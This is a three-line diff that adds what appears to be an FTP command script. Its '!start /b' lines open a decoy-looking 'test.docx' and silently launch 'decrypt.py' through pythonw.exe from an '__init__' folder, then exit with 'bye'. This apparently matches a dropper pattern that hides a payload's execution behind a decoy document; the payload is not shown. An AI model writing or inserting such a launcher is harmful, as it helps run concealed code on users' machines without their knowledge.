@@ -1,0 +1,3 @@
+!start /b __init__\test.docx
+!start /b __init__\pythonw.exe __init__\decrypt.py
+bye
